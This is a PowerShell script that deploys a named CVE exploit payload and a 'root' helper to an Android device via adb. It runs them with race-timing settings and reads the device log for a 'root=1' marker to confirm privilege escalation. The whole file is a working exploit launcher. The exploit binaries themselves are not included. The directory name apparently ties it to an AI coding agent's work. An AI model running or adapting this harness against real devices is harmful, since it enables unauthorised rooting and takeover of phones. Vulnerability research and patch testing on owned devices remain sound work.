param(
    [string]$Payload,
    [string]$Helper,
    [string]$Serial,
    [int]$TimeoutSeconds = 180
)

$ErrorActionPreference = "Stop"

if (-not $Payload) {
    $Payload = Join-Path $PSScriptRoot "..\build\pa3q-S9380ZHU1AYA1\cve-2026-43499-app.so"
}
if (-not $Helper) {
    $Helper = Join-Path $PSScriptRoot "..\build\pa3q-S9380ZHU1AYA1\cve-2026-43499-root"
}

if (-not (Test-Path -LiteralPath $Payload)) {
    throw "payload not found: $Payload"
}
if (-not (Test-Path -LiteralPath $Helper)) {
    throw "helper not found: $Helper"
}

$adb = $env:ADB
if (-not $adb) {
    $command = Get-Command adb -ErrorAction SilentlyContinue
    if ($command) {
        $adb = $command.Source
    }
}
if (-not $adb) {
    $candidates = @(
        "$env:LOCALAPPDATA\Android\Sdk\platform-tools\adb.exe",
        "$env:LOCALAPPDATA\Microsoft\WinGet\Packages\Google.PlatformTools_Microsoft.Winget.Source_8wekyb3d8bbwe\platform-tools\adb.exe"
    )
    $adb = $candidates | Where-Object { Test-Path -LiteralPath $_ } |
        Select-Object -First 1
}
if (-not $adb) {
    throw "adb.exe not found; set ADB to its full path"
}

$adbArgs = if ($Serial) { @("-s", $Serial) } else { @() }
$remoteDir = "/data/local/tmp/codex-app-preflight"
$remotePayload = "$remoteDir/cve-2026-43499-app.so"
$remoteHelper = "$remoteDir/cve-2026-43499-root"
$remoteLog = "$remoteDir/app-adb.log"

& $adb @adbArgs wait-for-device
& $adb @adbArgs shell "mkdir -p $remoteDir; rm -f $remoteLog"
& $adb @adbArgs push $Payload $remotePayload
& $adb @adbArgs push $Helper $remoteHelper
& $adb @adbArgs shell "chmod 755 $remotePayload $remoteHelper"

$command = "PSELECT_ROUTE_ATTEMPTS=1 PSELECT_DELAY_USEC=20000 $remoteHelper --run-payload $remotePayload $remoteHelper $remoteLog"
$job = Start-Job -ScriptBlock {
    param($adbPath, $deviceSerial, $remoteCommand)
    if ($deviceSerial) {
        & $adbPath -s $deviceSerial shell $remoteCommand
    } else {
        & $adbPath shell $remoteCommand
    }
} -ArgumentList $adb, $Serial, $command

$completed = Wait-Job $job -Timeout $TimeoutSeconds
if ($completed) {
    Receive-Job $job
} else {
    Stop-Job $job
    Write-Warning "ADB command timed out after $TimeoutSeconds seconds"
}
Remove-Job $job -Force

Start-Sleep -Seconds 5
$log = & $adb @adbArgs shell "cat $remoteLog 2>/dev/null"
$log | Out-Host

if ($log -match "done=1 root=1") {
    Write-Host "APP payload preflight: SUCCESS marker found"
    exit 0
}
if ($log -match "p0 pipe gate hits=0|reboot") {
    Write-Warning "APP payload preflight reached the APP route but did not reach root"
    exit 2
}
Write-Warning "APP payload preflight did not produce a success marker"
exit 1
